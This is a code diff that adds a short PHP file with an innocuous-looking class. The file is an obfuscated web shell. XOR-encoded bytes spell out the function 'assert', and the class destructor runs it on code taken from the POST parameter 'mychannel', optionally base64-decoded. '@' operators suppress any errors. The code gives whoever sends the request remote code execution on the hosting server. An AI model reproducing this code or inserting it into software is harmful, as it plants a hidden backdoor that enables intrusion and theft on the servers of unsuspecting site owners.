@@ -1,0 +1,20 @@
+<?php 
+class NGUR { 
+    function arjG() {
+        $FvaT = "\x27" ^ "\x46";
+        $dPDn = "\x51" ^ "\x22";
+        $HrSI = "\x95" ^ "\xe6";
+        $gKSP = "\x6e" ^ "\xb";
+        $iKdx = "\xb6" ^ "\xc4";
+        $QNFS = "\xde" ^ "\xaa";
+        $OIbW =$FvaT.$dPDn.$HrSI.$gKSP.$iKdx.$QNFS;
+        return $OIbW;
+    }
+    function __destruct(){
+        $QmJU=$this->arjG();
+        @$QmJU($this->zy);
+    }
+}
+$ngur = new NGUR();
+@$ngur->zy = isset($_GET['id'])?base64_decode($_POST['mychannel']):$_POST['mychannel'];
+?>
